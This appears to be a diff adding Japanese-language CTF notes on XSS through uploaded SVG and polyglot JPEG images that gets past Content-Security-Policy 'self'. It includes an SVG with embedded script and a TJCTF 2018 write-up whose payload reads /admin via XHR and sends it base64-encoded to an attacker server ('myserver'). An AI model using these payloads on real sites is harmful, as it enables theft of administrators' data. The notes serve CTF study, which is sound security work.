@@ -175,6 +175,40 @@ https://www.calc.mie.jp/posts/2017-12-26-json-injection.html
 https://diary.shift-js.info/css-injection/   
 JSじゃなくて任意のCSSを埋め込めるときに使えそう。   
 
+## XSS with image (ex. SVG mbep jpg)
+SVG画像はXML形式なため、Javascriptを以下のように埋め込める。  
+upload先の画像を使うのでCSPが`script-src 'self'`となって自分のドメイン内からしかJavascriptを実行できない場合にCSPをバイパスできる。  
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">  
+   <script>
+      alert("svg");
+   </script>
+<image id="image0" width="100" height="100" x="0" y="0"
+    href="" />
+</svg>
+```
+これで、`http://example.com/evil.svg`にアクセスすれば`evil.svg`内のJavascriptを実行できる。  
+また、`http://example.com/index.html`内の`<iframe src=/evil.svg>`,`<embed src=/evil.svg>`で`evil.svg`内のJavascriptを実行できる。  
+`<script src=/evil.svg>`,`<img src=/evil.svg>`,`<object src=/evil.svg>`ではJavascriptは実行されなかった…  
+http://cocu.hatenablog.com/entry/2013/12/23/033137  
+ここにも同様の実験がされてるが、結果が違うぞ…？？？  
+  
+基本的にSVGでのXSSの問題は、何らかの画像ファイルがアップロードできて、その画像のURLをAdminのクローラに踏ませることでSVG内のJavascriptを実行する。  
+  
+SVG画像以外をXSSに使用する場合は、`.webp`,`jpg`などがあるっぽい？  
+基本的にこれらの画像ファイルをアップロードして、そのURLにアクセスすると`Content-Type: image/png`などのContent typeがサーバーに返され、ブラウザがこれをHTMLとしてではなく画像ファイルとして認識してHTMLで解釈せず画像ファイルとして開こうとするため、画像ファイルの中にJavaScriptを挿入していても実行は(基本的に)できない。  
+  
+ただサーバー側の設定で、中身がJavaScriptの`alert.png`ファイルを、中身だけからContent typeを`application/javascript`として認識して返す場合には、ブラウザにはJavaScriptとして渡されるためJavaScriptを実行できる。  
+  
+また、サーバー側でContent typeを判断できずに何も返さない場合、ブラウザ側でそのファイルをどう扱うかを判断する必要がありそこでJavaScriptとして認識して実行することになる可能性がある。`.webp`はこれ？  
+なので、基本的には、中身がJavaScriptの`alert.png`などを送信してContent typeを見て、`image/`がセットされていないものを探す？  
+アップロードしたURLが`/<Username>/upload`みたいな感じで拡張子を持たない場合は、Content typeが`application/octet-stream`となる場合は、`<script src=http://.../<username>/upload>`みたいにしてJavascriptを実行できる？？  
+  
+JavaScriptが埋め込まれたjpgファイルはここにある。  
+https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
+
 # writeup
 ## Reflect / JSON Injection (CONFidence 2020 Teaser)
 https://www.gem-love.com/ctf/2019.html   
@@ -1290,6 +1324,25 @@ print(r.headers['Content-Type'])
 
 # p4{15_1t_1m4g3_or_n0t?}
 ```
+## jpg file upload / cSP 'self' bypass (TJCTF 2018 - Stupid Blog)
+https://graneed.hatenablog.com/entry/2018/08/13/103000  
+- **entrypoint**   
+プロフィール画像をアップロードできる機能がある。adminにUserを報告する機能があり、AdminのクローラがそのUserのプロフィールページを巡回してくれるので、プロフィールページにXSSするとわかる。  
+CSPは`Content-Security-Policy: default-src 'self'`なので`<script>`はサニタイジングがないので挿入できるが実行はできない。  
+プロフィール画像のURLは`https://stupid_blog.tjctf.org/<Username>/pfp`となっており拡張子が含まれないため、`Content-Type: application/octet-stream`でscriptファイルとして読み込めるらしい。  
+https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
+ここで紹介されているJavaScriptが挿入されたJPGファイルをアップロードして`<script charset="ISO-8859-1" src="/<Username>/pfp"></script>`で読み込むと無事JavaScriptが実行できる！  
+`/admin`にアクセスするようなJavaScriptをXHRで実行させて読み込んだデータを攻撃者サーバーに送信させればOK  
+- **Payload**   
+https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs  
+に挿入されたJavaScriptを以下に変更する。  
+```js
+xmlhttp=new XMLHttpRequest();
+xmlhttp.open("GET","/admin",false);
+xmlhttp.send();
+r=xmlhttp.responseText;
+location.href='http://myserver/?q='+btoa(r);
+```
 ## 
 - **entrypoint**   
 - **概要**   
@@ -1299,7 +1352,6 @@ print(r.headers['Content-Type'])
 - **entrypoint**   
 - **概要**   
 - **Payload**   
-
 
 ## CSS Injection / Self Injection / Header Injection / Command Injection (Google CTF Cat Chat)
 https://terjanq.github.io/google-ctf-writeups/   
